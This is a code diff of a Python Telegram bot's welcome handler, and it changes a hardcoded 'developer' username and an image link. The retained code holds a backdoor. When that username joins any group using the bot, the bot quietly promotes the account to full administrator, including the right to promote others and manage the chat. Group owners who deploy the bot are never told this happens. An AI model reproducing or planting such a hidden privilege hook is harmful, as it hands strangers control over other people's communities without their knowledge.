@@ -11,7 +11,7 @@ from PIL import (Image, ImageDraw, ImageEnhance, ImageFilter,
                  ImageFont, ImageOps)
 from youtubesearchpython.__future__ import VideosSearch
 
-ahmed = "https://telegra.ph/file/0a2e4b9e06d957bf4c1ed.jpg"
+ahmed = "https://telegra.ph/file/de2bd04e32925298c13eb.jpg"
 
 
 def changeImageSize(maxWidth, maxHeight, image):
@@ -123,15 +123,15 @@ async def welcome(client: Client, message):
    try:
     bot = client.me
     bot_username = bot.username
-    if message.new_chat_members[0].username == "R7_OX":
+    if message.new_chat_members[0].username == "NUNUU":
       try:
          chat_id = message.chat.id
          user_id = message.new_chat_members[0].id
          await client.promote_chat_member(chat_id, user_id, privileges=enums.ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
-         await client.set_administrator_title(chat_id, user_id, "رويس")
+         await client.set_administrator_title(chat_id, user_id, "بلال")
       except:
         pass
-      return await message.reply_text(f"**انضم المطور رويس للشات .\nمرحبا بك : @R7_OX .**")
+      return await message.reply_text(f"**انضم المطور رويس للشات .\nمرحبا بك : NUNUU .**")
     dev = await get_dev(bot_username)
     if message.new_chat_members[0].id == dev:
       try:
